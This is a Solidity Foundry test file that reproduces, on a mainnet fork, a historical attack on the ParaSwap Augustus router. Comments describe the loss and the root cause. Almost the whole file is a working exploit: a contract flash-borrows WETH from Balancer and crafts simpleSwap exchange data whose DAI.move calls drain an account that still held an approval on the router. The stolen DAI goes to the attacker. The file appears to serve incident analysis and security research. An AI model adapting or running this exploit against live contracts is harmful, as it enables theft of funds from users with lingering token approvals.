// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 2,298.68 USD
// Attacker : 0x2d9a39de3e5227ff74b4cfc154b16fd77614ee33
// Attack Contract : 0x5b24ff16da6b75cc1e18c9361d8deaeae5ea2f0f
// Alert Victim : 0xb5d85cbf7cb3ee0d56b3bb207d5fc4b82f43f511
// DAI Source Account : 0x1e0c22a1f39b6c7f36661297437e874ec31fa0b1
// Attack Tx : https://etherscan.io/tx/0xed5f932a136ef95b943951ce103b3edbe600bf2c2607edff7b6ea9ada35ca300
//
// @Info
// ParaSwap AugustusSwapper : https://etherscan.io/address/0xdef171fe48cf0115b1d80b88dc8eab59176fee57#code
//
// @Analysis
// Telegram Alert : https://t.me/defimon_alerts/1352
//
// Attack summary: the attacker flash-borrowed 1000 wei of WETH from Balancer, used it as the
// fromToken for a ParaSwap simpleSwap, and supplied exchangeData that repaid the WETH while moving
// DAI from an account that had authorized ParaSwap. ParaSwap then transferred the received DAI to
// the attacker-designated beneficiary.
// Root cause: the DAI source account had authorized the ParaSwap Augustus router, and simpleSwap lets
// the caller provide arbitrary callee/exchangeData sequences. The router's DAI.move calls execute as
// ParaSwap, so the stale authorization lets an unprivileged caller drain the approved DAI balance.

address constant ATTACKER = address(uint160(0x002d9a39de3e5227ff74b4cfc154b16fd77614ee33));
address constant HISTORICAL_ATTACK_CONTRACT = address(uint160(0x005b24ff16da6b75cc1e18c9361d8deaeae5ea2f0f));
address constant HISTORICAL_FLASH_HELPER = address(uint160(0x00be15c4e75c11bd41f5e65165b9fee0b00ef30ad3));
address constant ALERT_VICTIM = address(uint160(0x00b5d85cbf7cb3ee0d56b3bb207d5fc4b82f43f511));
address constant DAI_SOURCE_ACCOUNT = address(uint160(0x001e0c22a1f39b6c7f36661297437e874ec31fa0b1));
address constant BALANCER_VAULT = address(uint160(0x00ba12222222228d8ba445958a75a0704d566bf2c8));
address constant PARASWAP_AUGUSTUS = address(uint160(0x00def171fe48cf0115b1d80b88dc8eab59176fee57));
address constant TOKEN_TRANSFER_PROXY = address(uint160(0x00216b4b4ba9f3e719726886d34a177484278bfcae));
address constant WETH_TOKEN = address(uint160(0x00c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2));
address constant DAI_TOKEN = address(uint160(0x006b175474e89094c44da98b954eedeac495271d0f));

uint256 constant FLASH_WETH_AMOUNT = 1_000;
uint256 constant DAI_DRAIN_AMOUNT = 2_299_037_211_488_404_869_264;
uint256 constant FIRST_DAI_MOVE_AMOUNT = DAI_DRAIN_AMOUNT - 1;
uint256 constant HISTORICAL_DEADLINE = 1_750_817_123;

interface IBalancerVault1352 {
    function flashLoan(
        address recipient,
        IERC20[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface IBalancerFlashLoanRecipient1352 {
    function receiveFlashLoan(
        IERC20[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external;
}

interface IDAIMove1352 {
    function move(address src, address dst, uint256 wad) external;
}

interface IParaSwapSimpleSwap1352 {
    struct SimpleData {
        address fromToken;
        address toToken;
        uint256 fromAmount;
        uint256 toAmount;
        uint256 expectedAmount;
        address[] callees;
        bytes exchangeData;
        uint256[] startIndexes;
        uint256[] values;
        address payable beneficiary;
        address payable partner;
        uint256 feePercent;
        bytes permit;
        uint256 deadline;
        bytes16 uuid;
    }

    function simpleSwap(
        SimpleData calldata data
    ) external payable returns (uint256 receivedAmount);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("mainnet", 22_778_354);
        vm.roll(22_778_355);
        vm.warp(HISTORICAL_DEADLINE);

        fundingToken = DAI_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(HISTORICAL_FLASH_HELPER, "Historical flash helper");
        vm.label(ALERT_VICTIM, "Alert victim");
        vm.label(DAI_SOURCE_ACCOUNT, "DAI source account");
        vm.label(BALANCER_VAULT, "Balancer vault");
        vm.label(PARASWAP_AUGUSTUS, "ParaSwap Augustus");
        vm.label(TOKEN_TRANSFER_PROXY, "ParaSwap token transfer proxy");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(DAI_TOKEN, "DAI");
    }

    function testExploit() public balanceLog {
        uint256 attackerDaiBefore = IERC20(DAI_TOKEN).balanceOf(ATTACKER);
        uint256 sourceDaiBefore = IERC20(DAI_TOKEN).balanceOf(DAI_SOURCE_ACCOUNT);
        uint256 balancerWethBefore = IERC20(WETH_TOKEN).balanceOf(BALANCER_VAULT);

        assertGe(sourceDaiBefore, DAI_DRAIN_AMOUNT);

        ParaSwapDAIApprovalAttack attack = new ParaSwapDAIApprovalAttack(ATTACKER);
        attack.execute();

        assertEq(IERC20(WETH_TOKEN).balanceOf(BALANCER_VAULT), balancerWethBefore);
        assertEq(sourceDaiBefore - IERC20(DAI_TOKEN).balanceOf(DAI_SOURCE_ACCOUNT), DAI_DRAIN_AMOUNT);
        assertEq(IERC20(DAI_TOKEN).balanceOf(ATTACKER) - attackerDaiBefore, DAI_DRAIN_AMOUNT);
    }
}

contract ParaSwapDAIApprovalAttack is IBalancerFlashLoanRecipient1352 {
    address private immutable profitReceiver;

    constructor(
        address receiver
    ) {
        profitReceiver = receiver;
    }

    function execute() external {
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(WETH_TOKEN);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_WETH_AMOUNT;

        IBalancerVault1352(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, new bytes(0));
    }

    function receiveFlashLoan(
        IERC20[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata
    ) external override {
        require(msg.sender == BALANCER_VAULT, "unexpected lender");
        require(amounts[0] == FLASH_WETH_AMOUNT && feeAmounts[0] == 0, "unexpected flash loan");

        IERC20(WETH_TOKEN).approve(TOKEN_TRANSFER_PROXY, FLASH_WETH_AMOUNT);

        IParaSwapSimpleSwap1352.SimpleData memory data = _buildSwapData();
        uint256 received = IParaSwapSimpleSwap1352(PARASWAP_AUGUSTUS).simpleSwap(data);
        require(received == DAI_DRAIN_AMOUNT, "unexpected received amount");
    }

    function _buildSwapData() private view returns (IParaSwapSimpleSwap1352.SimpleData memory data) {
        address[] memory callees = new address[](3);
        callees[0] = WETH_TOKEN;
        callees[1] = DAI_TOKEN;
        callees[2] = DAI_TOKEN;

        bytes memory exchangeData = bytes.concat(
            abi.encodeWithSelector(IERC20.transfer.selector, BALANCER_VAULT, FLASH_WETH_AMOUNT),
            abi.encodeWithSelector(IDAIMove1352.move.selector, DAI_SOURCE_ACCOUNT, PARASWAP_AUGUSTUS, FIRST_DAI_MOVE_AMOUNT),
            abi.encodeWithSelector(IDAIMove1352.move.selector, DAI_SOURCE_ACCOUNT, PARASWAP_AUGUSTUS, uint256(1))
        );

        uint256[] memory startIndexes = new uint256[](4);
        startIndexes[0] = 0;
        startIndexes[1] = 68;
        startIndexes[2] = 168;
        startIndexes[3] = 268;

        uint256[] memory values = new uint256[](3);

        data = IParaSwapSimpleSwap1352.SimpleData({
            fromToken: WETH_TOKEN,
            toToken: DAI_TOKEN,
            fromAmount: FLASH_WETH_AMOUNT,
            toAmount: 1,
            expectedAmount: DAI_DRAIN_AMOUNT,
            callees: callees,
            exchangeData: exchangeData,
            startIndexes: startIndexes,
            values: values,
            beneficiary: payable(profitReceiver),
            partner: payable(profitReceiver),
            feePercent: 0,
            permit: new bytes(0),
            deadline: HISTORICAL_DEADLINE,
            uuid: bytes16(0)
        });
    }
}
